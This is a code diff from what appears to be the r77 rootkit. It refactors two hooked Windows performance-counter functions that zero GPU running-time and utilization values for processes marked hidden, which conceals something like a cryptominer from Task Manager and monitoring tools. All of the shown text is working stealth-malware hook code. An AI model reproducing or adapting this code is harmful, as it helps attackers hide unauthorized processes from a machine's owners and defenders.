@@ -568,23 +568,23 @@ static NTSTATUS NTAPI HookedNtDeviceIoControlFile(HANDLE fileHandle, HANDLE even
 
 	return status;
 }
-static PDH_STATUS WINAPI HookedPdhGetRawCounterArrayW(PDH_HCOUNTER counter, LPDWORD bufferSize, LPDWORD itemCount, PPDH_RAW_COUNTER_ITEM_W itemBuffer)
+static PDH_STATUS WINAPI HookedPdhGetRawCounterArrayW(PDH_HCOUNTER counter, LPDWORD bufferSize, LPDWORD itemCount, PNT_PDH_RAW_COUNTER_ITEM_W itemBuffer)
 {
 	PDH_STATUS status = OriginalPdhGetRawCounterArrayW(counter, bufferSize, itemCount, itemBuffer);
 
 	if (status == ERROR_SUCCESS && itemCount && itemBuffer)
 	{
 		DWORD infoBufferSize = 0;
-		if (PdhGetCounterInfoW(counter, FALSE, &infoBufferSize, NULL) == PDH_MORE_DATA)
+		if (R77_PdhGetCounterInfoW(counter, FALSE, &infoBufferSize, NULL) == PDH_MORE_DATA)
 		{
-			PPDH_COUNTER_INFO_W info = (PPDH_COUNTER_INFO_W)NEW_ARRAY(BYTE, infoBufferSize);
-			if (PdhGetCounterInfoW(counter, FALSE, &infoBufferSize, info) == ERROR_SUCCESS)
+			PNT_PDH_COUNTER_INFO_W info = (PNT_PDH_COUNTER_INFO_W)NEW_ARRAY(BYTE, infoBufferSize);
+			if (R77_PdhGetCounterInfoW(counter, FALSE, &infoBufferSize, info) == ERROR_SUCCESS)
 			{
-				if (!StrCmpW(info->szFullPath, L"\\GPU Engine(*)\\Running Time"))
+				if (!StrCmpW(info->FullPath, L"\\GPU Engine(*)\\Running Time"))
 				{
 					for (DWORD i = 0; i < *itemCount; i++)
 					{
-						if (GetIsHiddenFromPdhString(itemBuffer[i].szName))
+						if (GetIsHiddenFromPdhString(itemBuffer[i].Name))
 						{
 							itemBuffer[i].RawValue.FirstValue = 0;
 							itemBuffer[i].RawValue.SecondValue = 0;
@@ -600,27 +600,27 @@ static PDH_STATUS WINAPI HookedPdhGetRawCounterArrayW(PDH_HCOUNTER counter, LPDW
 
 	return status;
 }
-static PDH_STATUS WINAPI HookedPdhGetFormattedCounterArrayW(PDH_HCOUNTER counter, DWORD format, LPDWORD bufferSize, LPDWORD itemCount, PPDH_FMT_COUNTERVALUE_ITEM_W itemBuffer)
+static PDH_STATUS WINAPI HookedPdhGetFormattedCounterArrayW(PDH_HCOUNTER counter, DWORD format, LPDWORD bufferSize, LPDWORD itemCount, PNT_PDH_FMT_COUNTERVALUE_ITEM_W itemBuffer)
 {
 	PDH_STATUS status = OriginalPdhGetFormattedCounterArrayW(counter, format, bufferSize, itemCount, itemBuffer);
 
 	if (status == ERROR_SUCCESS && itemCount && itemBuffer)
 	{
 		DWORD infoBufferSize = 0;
-		if (PdhGetCounterInfoW(counter, FALSE, &infoBufferSize, NULL) == PDH_MORE_DATA)
+		if (R77_PdhGetCounterInfoW(counter, FALSE, &infoBufferSize, NULL) == PDH_MORE_DATA)
 		{
-			PPDH_COUNTER_INFO_W info = (PPDH_COUNTER_INFO_W)NEW_ARRAY(BYTE, infoBufferSize);
-			if (PdhGetCounterInfoW(counter, FALSE, &infoBufferSize, info) == ERROR_SUCCESS)
+			PNT_PDH_COUNTER_INFO_W info = (PNT_PDH_COUNTER_INFO_W)NEW_ARRAY(BYTE, infoBufferSize);
+			if (R77_PdhGetCounterInfoW(counter, FALSE, &infoBufferSize, info) == ERROR_SUCCESS)
 			{
-				if (!StrCmpW(info->szFullPath, L"\\GPU Engine(*)\\Utilization Percentage"))
+				if (!StrCmpW(info->FullPath, L"\\GPU Engine(*)\\Utilization Percentage"))
 				{
 					for (DWORD i = 0; i < *itemCount; i++)
 					{
-						if (GetIsHiddenFromPdhString(itemBuffer[i].szName))
+						if (GetIsHiddenFromPdhString(itemBuffer[i].Name))
 						{
-							itemBuffer[i].FmtValue.longValue = 0;
-							itemBuffer[i].FmtValue.doubleValue = 0;
-							itemBuffer[i].FmtValue.largeValue = 0;
+							itemBuffer[i].FmtValue.LongValue = 0;
+							itemBuffer[i].FmtValue.DoubleValue = 0;
+							itemBuffer[i].FmtValue.LargeValue = 0;
 						}
 					}
 				}
